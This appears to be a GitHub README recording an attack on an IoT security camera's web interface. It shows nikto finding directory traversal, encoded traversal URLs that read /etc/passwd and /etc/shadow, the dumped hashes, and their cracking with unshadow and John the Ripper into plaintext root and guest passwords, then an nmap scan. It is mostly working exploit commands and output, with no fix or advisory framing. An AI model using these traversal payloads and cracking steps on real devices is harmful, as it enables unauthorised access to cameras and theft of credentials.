# Web Client Security Camera

# IoT Device Security Camera

<img src="https://raw.githubusercontent.com/0x01369/Web-Client-Security-Camera/main/appName.png" class="shrinkToFit" width="350" height="55">

<img src="https://raw.githubusercontent.com/0x01369/Web-Client-Security-Camera/main/Login_LoginContent.png" class="shrinkToFit" width="693" height="236">

+ root@kali:~$  nikto -h 192.168.1.11

+ ---------------------------------------------------------------------------
+ Target IP:          192.168.1.11
+ Target Port:        80
+ ---------------------------------------------------------------------------
+ /%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd: The Web_Server_4D is vulnerable to a directory traversal problem.
+ /../../../../../../../../../../etc/passwd: It is possible to read files on the server by adding ../ in front of file name.
+ /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd: Web server allows reading of files by sending encoded '../' requests. This server may be Boa +(boa.org).
+ OSVDB-3133: ////////../../../../../../etc/passwd: Xerox WorkCentre allows any file to be retrieved remotely.
+ ---------------------------------------------------------------------------

+ http://192.168.1.11/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+ http://192.168.1.11/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow

+ /etc/passwd

+ root:x:0:0:root:/:/bin/sh
+ guest:x:1000:1000:Linux User,,,:/:/bin/sh

+ /etc/shadow

+ root:3kzd9/xqjB.3k:16772:0:99999:7:::
+ guest:IhQlNqID7twUk:16772:0:99999:7:::

+ root@kali:~$ unshadow /root/Desktop/passwd /root/Desktop/shadow > /root/Desktop/status

+ root:3kzd9/xqjB.3k:0:0:root:/:/bin/sh
+ guest:IhQlNqID7twUk:1000:1000:Linux User,,,:/:/bin/sh

+ root@kali:~$ john /root/Desktop/status

+ Loaded 2 password hashes with 2 different salts (descrypt, traditional crypt(3) [DES 128/128 SSE2])
+ Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+ 1001chin         (root)
+ 123456           (guest)

+ root@kali:~$ map -sS -sV 192.168.1.11

+ Starting Nmap 7.91 ( https://nmap.org )
+ PORT     STATE SERVICE    VERSION
+ 80/tcp    open  tcpwrapped
+ 8080/tcp  open  http       Mini web server 1.0 (ZTE ZXV10 W300 ADSL router http config)
+ 58000/tcp open  http       CPE Server TR-069 remote access 1.0
|_http-server-header: CPE-SERVER/1.0 Supports only GET
|_http-title: Site doesn't have a title.
+ 17000/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     head
|   GenericLines: 
|     head
|     1111
|     1111
|     1111
|     1111
|   Help, NULL: 
|     head
|     1111
|_    1111
